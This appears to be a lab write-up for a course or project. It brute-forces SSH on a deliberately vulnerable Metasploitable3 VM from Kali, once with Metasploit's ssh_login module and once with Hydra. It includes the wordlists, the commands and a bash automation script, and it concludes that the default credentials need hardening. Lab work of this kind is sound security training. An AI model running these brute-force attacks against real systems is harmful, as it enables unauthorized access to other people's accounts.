# Phase 1 – Setup and Compromise the Service

## Objective

Set up the attacker and victim environments, then compromise a vulnerable SSH service using two methods:

* **Phase 1.1**: Brute-force attack using Metasploit and custom wordlists
* **Phase 1.2**: Automated brute-force attack using a Bash script with Hydra

---

## Environment Setup

* **Attacker Machine**: Kali Linux

  * Hostname: `kali`
  * Host-Only IP Address: `192.168.56.104`
  * NAT IP Address: `10.0.2.15`
  * Username: `kali`

* **Victim Machine**: Metasploitable3

  * Hostname: `metasploitable3`
  * Host-Only IP Address: `192.168.56.103`
  * NAT IP Address: `10.0.2.2`
  * Username: `vagrant`
  * Password: `vagrant`

* **Targeted Service**

  * **Service**: SSH
  * **Port**: 22
  * **Vulnerability**: Default/weak credentials
  * **Goal**: Compromise SSH access via brute-force attack

---

## Phase 1.1 – SSH Brute-Force Attack Using Metasploit

### 1. Launch Metasploit Framework

We started Metasploit with:

```bash
msfconsole
```

![Metasploit Launch](./Phase1_Screenshots/metasploit-launch.png)

---

### 2. Select and Configure Module

We selected the SSH login module:

```bash
use auxiliary/scanner/ssh/ssh_login
```

We then configured the target:

```bash
set RHOSTS 192.168.56.103
```

![Select Module](./Phase1_Screenshots/select-module.png)

---

### 3. Prepare and Load Wordlists

We created two files:

**user.txt**

```
msfadmin
user
postgres
vagrant
Rana
Sarah
Password
```

**pass.txt**

```
msfadmin
123456
toor
password
vagrant
123456789
101918
```

We set these files in Metasploit:

```bash
set USER_FILE user.txt
set PASS_FILE pass.txt
set VERBOSE true
```

![Wordlists Setup](./Phase1_Screenshots/set-wordlists.png)

---

### 4. Run the Attack

```bash
run
```

Metasploit attempted multiple combinations. It successfully logged in using:

* **Username**: `vagrant`
* **Password**: `vagrant`

```text
[+] 192.168.56.103:22 - Success: 'vagrant:vagrant'
```

![SSH Login Success](./Phase1_Screenshots/ssh-success.png)

---

### Summary

We successfully brute-forced the SSH credentials on Metasploitable3 using Metasploit and a dictionary attack. This confirms that the service is vulnerable due to default credentials.

---

## Phase 1.2 – Automated Hydra Attack Using Bash Script

### 1. Connectivity Test

We first verified that the attacker can reach the victim via `ping`:

```bash
ping 192.168.56.103
```

![Ping Test](./Phase1_Screenshots/ping-success.png)

---

### 2. Prepare Username and Password Lists

We created the following files:

**user.txt**

```
msfadmin
user
postgres
vagrant
```

![User List](./Phase1_Screenshots/user-list.png)

**pass.txt**

```
msfadmin
123456
toor
password
vagrant
```

![Password List](./Phase1_Screenshots/pass-list.png)

---

### 3. Run Hydra

Using the following command:

```bash
hydra -L user.txt -P pass.txt ssh://192.168.56.103 -t 4
```

Hydra successfully found:

* **Username**: `vagrant`
* **Password**: `vagrant`

![Hydra Success](./Phase1_Screenshots/hydra-success.png)

---

### 4. Bash Script Execution

We automated the attack with the following script:

**ssh\_bruteforce.sh**

```bash
#!/bin/bash
# Configuration
TARGET_IP="192.168.56.103"
USERNAME="vagrant"
PASSWORD_LIST="pass.txt"

# Run Hydra
echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
```

![Script Code](./Phase1_Screenshots/script-code.png)

Then ran:

```bash
chmod +x ssh_bruteforce.sh
./ssh_bruteforce.sh
```

Output confirmed success:

![Script Output](./Phase1_Screenshots/script-output.png)

---

## Conclusion

In both Phase 1.1 and 1.2, we successfully compromised the Metasploitable3 SSH service using dictionary-based brute-force attacks. The presence of weak/default credentials (`vagrant:vagrant`) made the system vulnerable. This confirms the need for further security hardening in the upcoming phases.

